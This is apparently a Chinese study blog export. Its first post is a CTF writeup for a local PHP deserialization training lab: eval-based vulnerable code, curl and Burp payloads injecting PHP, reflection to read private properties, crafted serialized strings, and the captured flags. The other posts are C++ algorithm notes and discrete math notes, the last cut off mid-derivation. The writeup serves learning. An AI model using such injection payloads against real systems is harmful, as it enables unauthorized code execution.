[{"title":"Hello CTF 从 0 开始的PHP反序列化入门靶场","url":"/2025/08/25/xue-xi/ctf/hello-ctf-cong-0-kai-shi-de-php-fan-xu-lie-hua-ru-men-ba-chang-writeup/","content":"# Hello CTF - 从 0 开始的PHP反序列化入门靶场 writeup\nRepo: [github.com/ProbiusOfficial/PHPSerialize-labs](https://github.com/ProbiusOfficial/PHPSerialize-labs)\n讨厌 PHP……不过也是做上了探姬老师出的题了。\n## 部署\n直接 docker 部署。\n```bash\ndocker run -p 8081:80 -d ghcr.io/probiusofficial/phpserialize-labs\n```\n\n直接访问 [localhost:8081](localhost:8081) 即可进入页面。\n\n![image.png](https://s3.moyuin.top/blog-images/2025/08/25/68ac18778ad94.png)\n\n---\n## Level 1\n\n```php\n<?php /*  \n--- HelloCTF - 反序列化靶场 关卡 1 : 类的实例化 ---   \n  \nHINT：尝实例化下面的FLAG类吧！  \n  \n# -*- coding: utf-8 -*-  \n# @Author: 探姬  \n# @Date:   2024-07-01 20:30  \n# @Repo:   github.com/ProbiusOfficial/PHPSerialize-labs  \n# @email:  admin@hello-ctf.com  \n# @link:   hello-ctf.com  \n  \n*/  \n  \n  \nclass FLAG{  \n    public $flag_string = \"HelloCTF{？？？？}\";  \n  \n    function __construct(){  \n        echo $this->flag_string;  \n    }  \n}  \n  \n$code = $_POST['code'];  \n  \neval($code);\n```\n\n- 古法 curl 炮制 post 请求，让 `code=new FLAG();` 。\n```shell\ncurl -X POST -d \"code=new FLAG();\" http://localhost:8081/Level1/index.php\n```\n\n- 或者使用 burpsuite 发送 post 请求，将 GET 改为 POST，在最后 body 里添加 \n```php\ncode=new FLAG();\n```\n\t\n**发送 POST 请求需要带 header**：`Content-Type: application/x-www-form-urlencoded`\n\n得到 flag\n```text\nHelloCTF{OK_Now_y0u_c4n_se3_me}\n```\n\n---\n## Level 2\n```php\n`<?php      /*   \n--- HelloCTF - 反序列化靶场 关卡 2 : 类值的传递 ---       \nHINT：尝试将flag传递出来~      \n# -*- coding: utf-8 -*-   \n# @Author: 探姬   \n# @Date:   2024-07-01 20:30   # @Repo:   github.com/ProbiusOfficial/PHPSerialize-labs   # @email:  admin@hello-ctf.com   \n# @link:   hello-ctf.com      */      \nerror_reporting(0); \n\n$flag_string = \"HelloCTF{？？？？}\";      \n  \nclass FLAG{           \n\tpublic $free_flag = \"???\";   \n\t           \n\tfunction get_free_flag(){               \n\t\techo $this->free_flag;           \n\t}       \n}   \n$target = new FLAG();      \n$code = $_POST['code'];      \nif(isset($code)){          \n\teval($code);       \n\t$target->get_free_flag();   \n}   \nelse{    \n\thighlight_file('source');   \n}   \n\t\n\tNow Flag is ???\n\n\n```\n\n一样是发送 POST 请求，但是设定好 code 后给 target 的 free_flag 修改为\n`$flag_string` 即可。\n- 对于 burpsuite，将 GET 改为 POST 后，在最后 body 添加：\n```php\ncode=new FLAG();\n$target->free_flag=$flag_string;\n```\n- 对于 curl，curl 在终端对 `$` 有特殊处理，需要使用单引号包裹请求。\n  > `$` 符号在 Linux/macOS 的终端（我们称之为 Shell，例如 Bash、Zsh）里是一个有特殊含义的字符。它被用来**引用变量**。\n  \n  \n```shell\ncurl -X POST -d 'code=new FLAG();\n$target->free_flag=$flag_string;' http://localhost:8081/Level2/index.php\n```\n```text\nNow Flag is HelloCTF{I_giv3_t0_y0u&y0u_giv3_t0_me}\n```\n\n---\n## Level 3\n```php\n<?php  \n  \n/*  \n--- HelloCTF - 反序列化靶场 关卡 3 : 对象中值的权限 ---   \n  \nHINT：尝试将flag传递出来~  \n  \n# -*- coding: utf-8 -*-  \n# @Author: 探姬  \n# @Date:   2024-07-01 20:30  \n# @Repo:   github.com/ProbiusOfficial/PHPSerialize-labs  \n# @email:  admin@hello-ctf.com  \n# @link:   hello-ctf.com  \n  \n*/  \n  \nclass FLAG{  \n    public $public_flag = \"HelloCTF{?\";  \n    protected $protected_flag = \"?\";  \n    private $private_flag = \"?}\";  \n  \n    function get_protected_flag(){  \n        return $this->protected_flag;  \n    }  \n  \n    function get_private_flag(){  \n        return $this->private_flag;  \n    }  \n}  \n  \nclass SubFLAG extends FLAG{  \n    function show_protected_flag(){  \n        return $this->protected_flag;  \n    }  \n  \n    function show_private_flag(){  \n        return $this->private_flag;  \n    }  \n}  \n  \n$target = new FLAG();  \n$sub_target = new SubFLAG();  \n  \n  \n$code = $_POST['code'];  \n  \nif(isset($code)){  \n    eval($code);  \n} else {    highlight_file(__FILE__);  \n    echo \"Trying to get FLAG...<br>\";  \n    echo \"Public Flag: \".$target->public_flag.\"<br>\";  \n    echo \"Protected Flag:\".$target->protected_flag .\"<br>\";  \n    echo \"Private Flag:\".$target->private_flag .\"<br>\";  \n}  \n  \n?>\nTrying to get FLAG...  \nPublic Flag: HelloCTF{se3_me_  \nProtected Flag: Error: Cannot access protected property FLAG:: in ?  \nPrivate Flag: Error: Cannot access private property FLAG:: in ?  \n...Wait,where is the flag?\n```\n\n拼接 flag，一个一个来。\nPublic 类是可以直接读取的。\nProtected 是子类可以读取的，`echo $sub_target->show_protected_flag();` 可得到。\nPrivate 类是子类也不可读取，只能通过 PHP 特性获取。\n\n常用的方法是，在PHP 有一个反射越权特性，可以通过构造反射类，在反射类里面设定访问权限，从而读取 private 内容。\n\n> PHP 提供了一整套强大的“反射”API，它允许程序在运行时检查自身的结构，包括类、方法、属性等，甚至可以无视 `private` 和 `protected` 的限制。这是最常用、最正规的“越权”方法。\n> **核心思想**：\n> 1. 获取这个类的反射实例 (`ReflectionClass`)。\n> 2. 从反射实例中获取私有属性的反射实例 (`ReflectionProperty`)。\n> 3. **使用 `setAccessible(true)` 方法，强行将这个私有属性设置为“可访问”**。\n> 4. 读取属性的值。\n\n```php\n// 首先必须有一个 FLAG 类的具体对象\n// 这个对象已经存在了，比如叫 $target\n// 如果没有，需要自己 new 一个\n\n// 获取 FLAG 类的反射\n$reflection = new ReflectionClass('FLAG');\n\n// 获取私有属性 private_flag\n$property = $reflection->getProperty('private_flag');\n\n// 设置属性为可访问\n$property->setAccessible(true);\n\n// 从这个实例中获取值，而不是从 $reflection 中获取\n$secret_value = $property->getValue($target);\n\necho $secret_value;\n```\n\n从而构造 POST 的 payload：\n```php\ncode=new FLAG();\n\n\necho $target->public_flag;\necho $sub_target->show_protected_flag();\n\n$reflection = new ReflectionClass('FLAG');\n$property = $reflection->getProperty('private_flag');\n$property->setAccessible(true);\n$secret_value = $property->getValue($target);\necho $secret_value;\n```\n或者发送 curl 请求：\n```shell\ncurl -X POST -d 'code=new FLAG();echo $target->public_flag;echo $sub_target->show_protected_flag();$reflection = new ReflectionClass('FLAG');$property =$reflection->getProperty('private_flag');$property->setAccessible(true);$secret_value = $property->getValue($target);echo $secret_value;' http://localhost:8081/Level3/index.php\n```\n\n```text\nHelloCTF{se3_me_4nd_g3t_mmmme}\n```\n\n---\n## Level 4\n```php\n<?php  \n  \n/*  \n--- HelloCTF - 反序列化靶场 关卡 4 : 序列化 ---   \n  \nHINT：嗯！？全是私有，怎么获取flag呢？试试序列化！  \n  \n# -*- coding: utf-8 -*-  \n# @Author: 探姬  \n# @Date:   2024-07-01 20:30  \n# @Repo:   github.com/ProbiusOfficial/PHPSerialize-labs  \n# @email:  admin@hello-ctf.com  \n# @link:   hello-ctf.com  \n  \n*/  \n  \nclass FLAG3{  \n    private $flag3_object_array = array(\"？\",\"？\");  \n}  \n  \nclass FLAG{  \n     private $flag1_string = \"？\";  \n     private $flag2_number = '?';  \n     private $flag3_object;  \n  \n    function __construct() {       \n     $this->flag3_object = new FLAG3();  \n    }  \n}  \n  \n$flag_is_here = new FLAG();  \n  \n  \n$code = $_POST['code'];  \n  \nif(isset($code)){  \n    eval($code);  \n} else {    \n\thighlight_file(__FILE__);  \n}\n```\n关于 PHP 反序列化的知识：\n>  **序列化 (`serialize`)**：将一个对象（或数组等）的状态，转换成一个可以存储或传输的字符串。 \n>  **反序列化 (`unserialize`)**：读取序列化后的字符串，并在内存中重建出原始的对象。\n\n序列化示例：\n```php\nclass SecretVault {\n    private $secret_key = \"CTF{...}\";\n    public $owner = \"Alice\";\n}\n\n$vault = new SecretVault();\n\n// 把 $vault 对象序列化\n$serialized_string = serialize($vault);\n\necho $serialized_string;\n```\n输出的字符串会是这样的： \n```\nO:10: \"SecretVault\":2:{s:25: \" SecretVault secret_key\";s:9: \"CTF{...}\";s:5: \"owner\";s:5: \"Alice\";}\n```\n这个字符串看起来复杂，但很有规律：\n- `O`: 表示这是一个对象 (Object)。\n- `10`: 表示类名的长度是 10个字符 (`SecretVault`)。\n- `\"SecretVault\"`: 类名。\n- `2`: 表示这个对象有 2个属性。\n- `{...}`: 花括号里是所有属性的描述。\n- `s:5:\"owner\";s:5:\"Alice\";`: 描述 `public` 属性 `owner`，`s` 代表字符串，`5` 是长度。\n- `s:25:\"\\0SecretVault\\0secret_key\";s:9:\"CTF{...}\";`: 描述 `private` 属性 `secret_key`。\n **这里出现了带空字节的特殊键名，可利用序列化处理获取 flag**。\n\n依赖这个原理，构造这样的 payload：\n```php\ncode=new FLAG();\necho serialize($flag_is_here);\n```\n得到(做一下切分处理，大括号拆开，分号隔行)：\n```\nO:4:\"FLAG\":3:\n{\ns:18:\"\u0000FLAG\u0000flag1_string\";\ns:8:\"ser4l1ze\";\ns:18:\"\u0000FLAG\u0000flag2_number\";\ni:2;\ns:18:\"\u0000FLAG\u0000flag3_object\";\nO:5:\"FLAG3\":1:{s:25:\"\u0000FLAG3\u0000flag3_object_array\";\na:2:{i:0;\ns:3:\"se3\";\ni:1;\ns:2:\"me\";}\n\t}\n}\n```\n把 s 开头也就是 string 全部提取出来，得到：\n- Flag 1_string:  ser4l1ze, \n- Flag2_number:  2,\n- Flag3_object: se3, me\n根据出现顺序，得到 flag（用下划线连接）\n```text\nHelloCTF{ser4l1ze_2_se3_me}\n```\n\n---\n## Level 5\n```php\n<?php  \n  \n/*  \n--- HelloCTF - 反序列化靶场 关卡 5 : 序列化规则 ---   \n  \nHINT：各有千秋~  \n  \n# -*- coding: utf-8 -*-  \n# @Author: 探姬  \n# @Date:   2024-07-01 20:30  \n# @Repo:   github.com/ProbiusOfficial/PHPSerialize-labs  \n# @email:  admin@hello-ctf.com  \n# @link:   hello-ctf.com  \n  \n*/  \n  \nclass a_class{  \n    public $a_value = \"HelloCTF\";  \n}  \n$a_object = new a_class();  \n$a_array = array(a=>\"Hello\",b=>\"CTF\");  \n$a_string = \"HelloCTF\";  \n$a_number = 678470;  \n$a_boolean = true;  \n$a_null = null;\n\n/*See How to serialize:  \na_object: O:7:\"a_class\":1:{s:7:\"a_value\";s:8:\"HelloCTF\";}  \na_array: a:2:{s:1:\"a\";s:5:\"Hello\";s:1:\"b\";s:3:\"CTF\";}  \na_string: s:8:\"HelloCTF\";  \na_number: i:678470;  \na_boolean: ;  \na_null: N;  \nNow your turn!*/\n\n<?php  \n  \n$your_object = unserialize($_POST['o']);  \n$your_array = unserialize($_POST['a']);  \n$your_string = unserialize($_POST['s']);  \n$your_number = unserialize($_POST['i']);  \n$your_boolean = unserialize($_POST['b']);  \n$your_NULL = unserialize($_POST['n']);  \n  \nif(    \n\t$your_boolean &&     \n\t$your_NULL == null &&    \n\t$your_string == \"IWANT\" &&    \n\t$your_number == 1 &&    \n\t$your_object->a_value == \"FLAG\" &&    \n\t$your_array['a'] == \"Plz\" && \n\t$your_array['b'] == \"Give_M3\"  \n){  \n    echo $flag;  \n}  \nelse{  \n    echo \"You really know how to serialize?\";  \n}\n\n\n```\n答案都已经在明面上了～我们 POST 一个序列化，令其反序列化的数据等于题目所需即可。\n\n构造 POST payload：\n```php\no=O:7:\"a_class\":1:{s:7:\"a_value\";s:4:\"FLAG\";}\n&a=a:2:{s:1:\"a\";s:3:\"Plz\";s:1:\"b\";s:7:\"Give_M3\";}\n&s=s:5:\"IWANT\";\n&i=i:1;\n&b=b:1;\n&n=N;\n\n```\n\n得到：\n```text\nHelloCTF{Gre4t,y0u_can_als0_ser4l1ze2se_1n_y0ur_m1nd!}\n```\n\n---\n未完待续……","tags":["学习","CTF","writeup"],"categories":["日常学习","CTF学习"]},{"title":"一些算法笔记","url":"/2025/07/01/xue-xi/suan-fa/yi-xie-suan-fa-bi-ji/","content":"# 一些算法笔记\n记录一些做题中不太知道的，免得丢掉印象。\n## Enum class\n```cpp\nenum class Gesture\n{\n    C, // 石头\n    J, // 剪刀\n    B  // 布\n};\n```\n\n对于 `enum class` 结构，调用的时候得用 `Gesture::C` 这种格式。\n\n## Map - low_bound\n在 `map` 里面有一个很好用的 `low_bound` 函数，在map中查找第一个**不小于**（也就是大于或等于）给定的 `key` 的元素。\n根据这个函数，可以实现一个区间的映射建立\n```cpp\nstd::map<int, char> gradeMap = { \n {59, 'F'}, // 0-59分 -> F\n {69, 'D'}, // 60-69分 -> D \n {79, 'C'}, // 70-79分 -> C \n {89, 'B'}, // 80-89分 -> B \n {100, 'A'} // 90-100分 -> A\n  };\n  \n  char getGradeFromMap(int score) {\n    // 如果分数小于0或者大于100，直接返回无效\n    if (score < 0 || score > 100) {\n        return '?';\n    }\n\n    // 查找第一个不小于score的键值对\n    auto it = gradeMap.lower_bound(score);\n\n    // lower_bound 找到了一个合法的区间上限\n    if (it != gradeMap.end()) {\n        // it->first 是上限分数，it->second 是对应的等级\n        return it->second;\n    }\n\n    // 如果没找到（比如分数大于100，虽然我们已经处理了），则为无效\n    return '?';\n}\n  \n```\n## Set\n`set` 调用的时候得用 `auto`，迭代器。\n用 `insert` 插入值，迭代器输出值，迭代器是指针，所以得 `*it` 用来解应用。\n见 [week 2 12拼写检查](https://cg.hnu.edu.cn/assignment/programList.jsp?proNum=12&courseID=99&assignID=1362&libCenter=false)。\n```cpp\nset<ll>s;\n    for(ll i=0;i<n;i++){\n        ll x;\n        cin>>x;\n        s.insert(x);\n    }\n    ll count=0;\n    for(auto it=s.begin();it!=s.end()&&count<k;it++){\n        count++;\n        cout<<*it<<\" \";\n    }\n```\n\n## 并行\n先把“并行”的本质想清楚：**一个任务最早能开工的时间 = 它所有前置任务的“完成时间”的最大值**。\n\n所以你不需要显式“合并时间”，只要维护“最早开始/完成时间”，并在拓扑序里用 max 推进，**并行的效果自然出现**。\n见 [luogu P1113](https://www.luogu.com.cn/problem/P1113)\n```cpp\n#include<iostream>\n#include<vector>\n#include<algorithm>\n#include<string>\nusing namespace std;\n//依次读入每个杂务的工作说明。计算出所有杂务都被完成的最短时间。\n// 互相没有关系的杂务可以同时工作\n// 有些杂务必须在另一些杂务完成的情况下才能进行。\n// 有需要完成的 n 个杂务的清单，并且这份清单是有一定顺序的，杂务 k (k>1) 的准备工作只可能在杂务 1 至 k−1 中。\n// 一道拓扑排序题，找到所有入度为0的点，更新其邻接点的入度，直到所有点都被更新完，但是并行计算时间是一个难点……\n// 有些任务不需要第二个任务完成，但是下一个任务需要第二个和第三个共同完成，且第二个任务完成时间比第三个短的话，特殊任务不能计入计算……\n// 难点是找到并行时间最大值。\n\n  \n\nstruct task\n{\n\tint id;\n\tint time;\n\tvector<int>next;\n\tint inDegree=0;\n};\n\nint main(){\n\tint n;\n\tcin>>n;\n\tvector<task>tasks(n+1);\n\tfor(int i=1;i<=n;i++){\n\t\tint id,t;\t\n\t\tcin>>id>>t;\t\n\t\ttasks[id].id=id;\n\t\ttasks[id].time=t;\n\t\tint k=-1;\n\t\twhile(cin>>k,k!=0){\n\t\t\ttasks[k].next.push_back(id);\n\t\t\ttasks[id].inDegree++;\t\n\t\t}\n\n}\n\nvector<int>start(n+1,0); // 每个任务的最早开工时间，我该做线性统计而非归并计算……\nvector<int>end(n+1,0); // 完成每个任务的最早时间\nfor(int i=1;i<=n;i++){\n\tif(tasks[i].inDegree==0){\n\t\tend[i]=start[i]+tasks[i].time;\n\tfor(int v:tasks[i].next){\n\t\tstart[v]=max(start[v],end[i]);\n\t\ttasks[v].inDegree--;\n\t}\n//当入度为0，可以和现有线性时间的标记终止时间做比较了……\n\t}\n}\n\n//最后终止的时间就是最短时间。把时间当作线性看待是关键。\ncout<<*max_element(end.begin(),end.end())<<endl;\nreturn 0;\n}\n```\n## Kahn 拓扑排序\n\n### **🟢 模板 1：固定源点 + 已知** **u < v**\n\n> （比如洛谷 [ P1807](https://www.luogu.com.cn/problem/P1807)，保证输入边满足 u < v）\n\n```cpp\nconst long long NEG = -(1LL << 60);\nvector<long long> dist(n+1, NEG);\ndist[src] = 0;\n\nfor (int u = 1; u <= n; ++u) {\n    if (dist[u] == NEG) continue; // 不可达跳过\n    for (auto [v, w] : adj[u]) {\n        dist[v] = max(dist[v], dist[u] + w);\n    }\n}\n```\n\n- **适用**：题面保证 u < v，编号就是拓扑序。\n- **结果**：`dist[v]` 是从源点出发到 v 的最长路。\n    \n---\n\n###  **🟡 模板 2：固定源点 + 不保证** **u < v**  \n\n> 需要自己跑 Kahn 拓扑\n\n```cpp\nconst long long NEG = -(1LL << 60);\nvector<long long> dist(n+1, NEG);\ndist[src] = 0;\n\nqueue<int> q;\nvector<int> indeg(n+1, 0);\n// 读边时统计 indeg[v]++\n\nfor (int i = 1; i <= n; ++i) \n    if (indeg[i] == 0) q.push(i);\n\nwhile (!q.empty()) {\n    int u = q.front(); q.pop();\n    if (dist[u] != NEG) { // 源点可达才转移\n        for (auto [v, w] : adj[u]) {\n            dist[v] = max(dist[v], dist[u] + w);\n            if (--indeg[v] == 0) q.push(v);\n        }\n    } else {\n        for (auto [v, w] : adj[u]) \n            if (--indeg[v] == 0) q.push(v);\n    }\n}\n```\n\n- **适用**：无 u < v 保证，但题目给的是 DAG。\n- **结果**：`dist[v]` 是从指定源点到 v 的最长路。\n---\n\n###  **🔴 模板 3：全图最长路径（任意源 → 任意点）**\n> 先找所有入度 0 的点作为源\n\n```cpp\nconst long long NEG = -(1LL << 60);\nvector<long long> dist(n+1, NEG);\n\nqueue<int> q;\nvector<int> indeg(n+1, 0);\n// 读边时统计 indeg[v]++\n\nfor (int i = 1; i <= n; ++i) {\n    if (indeg[i] == 0) {\n        dist[i] = 0; // 多源起点\n        q.push(i);\n    }\n}\n\nwhile (!q.empty()) {\n    int u = q.front(); q.pop();\n    if (dist[u] != NEG) {\n        for (auto [v, w] : adj[u]) {\n            dist[v] = max(dist[v], dist[u] + w);\n            if (--indeg[v] == 0) q.push(v);\n        }\n    } else {\n        for (auto [v, w] : adj[u]) \n            if (--indeg[v] == 0) q.push(v);\n    }\n}\n\nlong long ans = *max_element(dist.begin(), dist.end());\n```\n\n- **适用**：要求整个 DAG 上的最长路。\n- **结果**：ans 就是最长路径的长度。\n    \n\n---\n\n### **📌 小提示**\n- 记得用 long long，避免路径和爆 int。\n- NEG 要足够小，不然会被 +w 误更新。\n- 如果要输出具体路径，可以额外记录 `pre[v]` 来回溯。\n    \n\n---\n\n## 欧拉路径\n\n###  建模触发器\n题面一旦出现：**“把每个单词都用一次、能连就连、输出整条链”**\n→ 下意识联想到：**欧拉路径（边全用一次）**\n- 点 = 字母（a..z）\n- 边 = 单词（s[0] → s.back()，边上带着单词）\n###  先验判定（能不能存在）\n有向图欧拉路径充要条件（忽略方向连通 + 入出度条件）：\n- 忽略方向后，所有**出现过的点**在同一连通分量（否则必然“断链”）。\n- 入/出度：\n    - 欧拉回路：所有点 in = out\n    - 欧拉路径：恰有一个点 out = in + 1（起点），一个点 in = out + 1（终点），其余 in = out\n    - 其他情况 → 不存在\n\n### **起点怎么“自己选”**\n- 若存在路径（非回路）：**起点 = out = in + 1 的点**（唯一）。\n- 若是回路：理论上任意有边的点都可做起点。\n    为了**字典序最小**的成链，你的做法（每个点的出边按字典序取最小）已保证整体最小；起点通常选**最小字母且出度>0**就行。\n\n### 为啥“对起点做 DFS 就对了”\n核心是 **Hierholzer 算法**（欧拉路/回路的标准构造）：\n- 在当前点反复“取一条尚未用过的出边”走下去（你按字典序取最小）；\n- 没路可走就**回溯**，把刚走完的边对应的单词**压入答案**；\n- 因为边是“走完才收录”，最后得到的是**逆序**，所以要 reverse。\n    \n> 正确性的直觉：像在一个区域里“抽线”，抽到抽不动了就封口记录，最终把所有边都抽走一次，拼起来就是欧拉路；你按最小边优先走，得到的就是字典序最小。  \n###  为什么“dp/最短路/拓扑”都不合适\n- 要求“**每条边恰好一次**”是欧拉问题的专属信号；\n- 拓扑/最短路/DP关心的是“点/路径权值/次数”，不是“边使用一次且全覆盖”。\n- 所以这题不是“找最优”，而是“找一条恰好覆盖全部边的道”，自然落在 Hierholzer。\n### **可复用“推导清单”**\n1. 点=字母，边=单词（首→尾），边上存字符串\n2. 统计 in/out，并记录出现过的点\n3. 忽略方向做连通性检查\n4. 判度数：路径态/回路态；\n5. 起点：out=in+1 的点；若回路选最小出度>0 的点\n6. 各 `adj[u]` 升序，遍历时用 back()+pop_back()\n7. 跑 Hierholzer（递归/栈），收集边，逆序输出用 . 相连\n8. 验证边数是否都用到（`res.size()==n`）\n见 luogu [P1127](https://www.luogu.com.cn/problem/P1127)\n```cpp\n#include<iostream>\n#include<vector>\n#include<algorithm>\n#include<string>\nusing namespace std;\n\nvoid dfs(int u,vector<vector<string>>&adj,vector<string>&res){\n    while(!adj[u].empty()){\n        string s=adj[u].front();\n        adj[u].erase(adj[u].begin());\n        dfs(s.back()-'a',adj,res);\n        res.push_back(s);\n    }\n}\n\nint main(){\n    // 一个欧拉路径遍历的图？\n    int n;\n    cin>>n;\n    vector<string>str(n);\n    for(int i=0;i<n;i++) cin>>str[i];\n    vector<vector<string>>adj(26);\n    for(string &s:str){\n        adj[s[0]-'a'].push_back(s); //存单词去建立映射关系\n    }\n    for(auto &v:adj) sort(v.begin(),v.end()); //保证字母序\n    vector<int>indegree(26,0),outdegree(26,0);\n    for(int i=0;i<26;i++){\n        for(string &s:adj[i]){\n            outdegree[i]++;\n            indegree[s.back()-'a']++;\n        }\n    }\n    // 欧拉路径必要条件：有一个起点满足 outdegree-indegree=1，有一个终点满足 indegree-outdegree=1，其余点indegree=outdegree\n    int start=-1,end=-1;\n    for(int i=0;i<26;i++){\n        if(outdegree[i]-indegree[i]==1){\n            if(start==-1) start=i;\n            else { //多于一个起点\n                cout<<\"***\"<<endl;\n                return 0;\n            }\n        }\n        else if(indegree[i]-outdegree[i]==1){\n            if(end==-1) end=i;\n            else { //多于一个终点\n                cout<<\"***\"<<endl;\n                return 0;\n            }\n        }\n        else if(indegree[i]!=outdegree[i]){\n            cout<<\"***\"<<endl;\n            return 0;\n        }\n    }\n        vector<string>res;\n        if(start==-1){ //没有起点，说明是回路，从任意点开始\n            for(int i=0;i<26;i++){\n                if(outdegree[i]>0){\n                    start=i;\n                    break;\n                }\n            }   \n        }\n        dfs(start,adj,res);\n        if(res.size()!=n){ //没有遍历完所有边\n            cout<<\"***\"<<endl;\n            return 0;\n        }\n        reverse(res.begin(),res.end());\n        for(int i=0;i<res.size();i++){\n            cout<<res[i]<<(i==res.size()-1?\"\":\".\");\n        }\n        return 0;\n    }\n```\n\n## DP\n> “我设了个 `dp[..]`，但是它到底在帮我算什么？目标到底是什么？为什么转移方程就是这么写？”\n\n---\n\n### **🌱 动态规划的“核心三问”**\n\n每次遇到题目时，可以强迫自己回答这三个问题：\n1. **状态是什么？**\n    - dp[i] / dp[i][j] 代表什么量？\n    - 一句话清晰描述：它是“前 i 个物品的最优解”还是“走到 (i,j) 的最短路径”？\n        \n2. **目标是什么？**\n    - 我要的最终答案是 dp[n]、还是 max(dp[..])、还是 dp[n][m]？\n    - 把“输出需要什么”先对齐，避免“我设的状态跟目标无关”。\n        \n3. **转移怎么来？**\n    - 当前状态能从什么子问题转移而来？\n    - 每次写转移的时候，心里要对应一个“小故事”：比如“第 i 件物品选/不选”，“从左边或上边走过来”。\n        \n---\n### **🌰 举个小例子**\n> 最经典：爬楼梯问题。每次可以走 1 步或 2 步，问走到第 n 层的方案数。\n1. 状态：  \n    - dp[i] = 到达第 i 层的方案数。\n        \n2. 目标：\n    - 我要求的是 dp[n]。\n        \n3. 转移：\n    - 走到第 i 层，要么从 i-1 走一步上来，要么从 i-2 跨两步上来。\n    - 所以：dp[i] = dp[i-1] + dp[i-2]。\n        \n这个故事就非常清晰：**每个状态对应一个问题，每个转移对应一个选择。**\n\n---\n\n### **🔑 小技巧**\n\n- 一定要“写文字定义”：比如在草稿纸/注释里写清楚  \n    dp[i][j] = 用前 i 件物品、放入容量为 j 的背包时能得到的最大价值。  \n    ——这样你每次写转移的时候，就能检查：我写的推导是不是跟定义一致。\n    \n- 目标不清晰时，回到题目最后一句：“要求的是……”。\n    把它翻译成对应的 dp 状态。\n    \n\n---\n所以“每次设定 dp 目标不清晰”，其实就是**第 2 步没对齐**。\n解决方法就是：\n1. 明确状态定义；\n2. 明确我要的答案在哪个状态里；\n3. 再来写转移。\n    \n---\n### 卡特兰数\n经典栈序列。\n- n 个元素入栈出栈，每一步只能“入”或“出”，且出栈数从不超过入栈数（否则栈空）。\n- 这等价于括号序列或 Dyck 路径计数：合法序列数量 = Cₙ。\n\n三种常用公式\n1.\t递推（DP，最常见，也就是你代码里的式子）\n\t$C_0=1,\\quad C_n=\\sum_{k=0}^{n-1} C_k\\,C_{n-1-k}$\n\t时间 O(n^2)。\n\t\n2.\t闭式（组合数）\n    $C_n=\\frac{1}{n+1}\\binom{2n}{n}$\n\t适合用大整数或高精度库。\n\t\n3.\t线性递推（从前一项滚动推后一项）\n    $C_{n+1}=C_n\\cdot \\frac{4n+2}{n+2}$\n每步一次乘除，注意整除无误差；实现时最好用大整数或先约分。\n\n小表（前几项）\nn: 1,2,3,4,5,6,7,8,9,10\nCₙ: 1,2,5,14,42,132,429,1430,4862,16796\n\n整型范围提示\n\t•\tint 最多到 $2.1\\times10^9$；C₁₉=1,767,263,190 还勉强能放，C₂₀=6,564,120,420 就溢出了。\n\t•\tlong long 可安全到 n=35（C₃₅≈3.116×10¹⁸ < 2⁶³−1）。更大就要高精度。\n\n---\n## 二维矩阵\n二维矩阵题给人的压迫感，往往不在代码量，而在于：\n\t•\t坐标系的混乱：到底是 `a[x][y]` 还是` a[y][x]`？从 1 开始还是从 0 开始？\n\t•\t遍历方向的多样：上下左右、斜对角、跳马步，容易漏掉或写错。\n\t•\t边界条件的麻烦：是不是越界？是不是访问过？是不是要回溯？\n\t•\t可视化困难：在脑子里想“点和点的关系”比一维复杂很多。\n\n看到矩阵题会害怕，其实是大脑在提醒你“这类题细节多、容易掉坑”。\n\n---\n怎么化解这种“二维恐惧症”？\n\n### 技巧\n\n一些很实用的小技巧：\n1. 固定模板\n先写好一个方向数组，比如走 8 个方向：\n\n```cpp\nint dx[8] = {1,1,1,0,0,-1,-1,-1};\nint dy[8] = {1,0,-1,1,-1,1,0,-1};\n```\n\n或者像马跳的 8 个方向：\n\n```cpp\nint dx[8] = {1,1,-1,-1,2,2,-2,-2};\nint dy[8] = {2,-2,2,-2,1,-1,1,-1};\n```\n\n以后只要 `for(int d=0;d<8;d++){ nx=x+dx[d]; ny=y+dy[d]; }`，再加边界判断。这样就不会一边想题一边还要写乱七八糟的 if/else。\n\n2. 边界判断写成函数\n```cpp\nbool inside(int x,int y,int n){\n    return x>=1 && x<=n && y>=1 && y<=n;\n}\n```\n这样比直接写条件判断要清晰、少 bug。\n\n3. 先手动画一张小图\n比如 3×3、4×4，用笔画出来，标记 BFS 的扩展顺序，你会发现很多规律更直观。\n\n4.\t小数据先跑暴力\n先写 BFS/DFS 版本，在 n=5,k=2 这种小范围跑出来，打印过程，心里就踏实多了。\n\n---\n### 心态\n二维矩阵题 不是 DP 的专利，它可以是 BFS（可达性）、DFS（连通块）、模拟（翻格子）、数学（对称性）。你害怕其实是因为没把“矩阵”当作普通的图。把矩阵想成一个图，格子是节点，四周/八周/马步是边，其实问题就清爽了。\n\n---\n","tags":["学习","编程"],"categories":["日常学习","算法积累"]},{"title":"离散数学 - 组合数学","url":"/2025/06/05/xue-xi/shu-xue/chi-san-shu-xue-zu-he-shu-xue/","content":"# 离散数学 - 组合数学\n只是 copy，没有力气整理了。\n\n## 公式\n这两个公式在组合数学中非常有用，分别解决不同类型的问题。我们来逐个解释一下它们的来源和思路：\n\n### 1. 公式 C(n−k+1,k): “选 k 个不相邻元素”\n\n问题场景：\n从排成一排的 n 个不同元素中，选出 k 个元素，要求这 k 个元素中任意两个都不能相邻。问有多少种选法？\n**推导思路 (转换法/映射法):**\n1. **标记元素位置：** 假设这 n 个元素的位置编号为 1,2,…,n。我们要选出 k 个位置 x1​,x2​,…,xk​，并且它们满足 1≤x1​<x2​<…<xk​≤n。    \n2. **不相邻条件：** “任意两个不相邻”意味着：\n    - x2​−x1​≥2\n    - x3​−x2​≥2\n    - ...\n    - xk​−xk−1​≥2\n3. **变量代换 (核心技巧)：** 为了消除“≥2”这个不方便处理的条件，我们引入一组新的变量 y1​,y2​,…,yk​：\n    - y1​=x1​\n    - y2​=x2​−1\n    - y3​=x3​−2\n    - ...\n    - yk​=xk​−(k−1)\n4. **分析新变量的性质：**\n    - 由于 x1​≥1，所以 y1​≥1。\n    - y2​−y1​=(x2​−1)−x1​=(x2​−x1​)−1。因为 x2​−x1​≥2，所以 (x2​−x1​)−1≥1。这意味着 y2​>y1​。\n    - 同理，y3​−y2​=(x3​−2)−(x2​−1)=(x3​−x2​)−1≥1。这意味着 y3​>y2​。\n    - 依此类推，我们得到 1≤y1​<y2​<…<yk​。\n    - 现在看 yk​ 的上限：yk​=xk​−(k−1)。因为 xk​≤n，所以 yk​≤n−(k−1)=n−k+1。\n5. 问题转化：\n    我们成功地将“从 1,…,n 中选 k 个不相邻的数 xi​”的问题，转化为了“从 1,…,n−k+1 中选 k 个不同的数 yi​”的问题。\n    从 n−k+1 个数中选 k 个不同的数，选法数量就是组合数 C(n−k+1,k)。\n    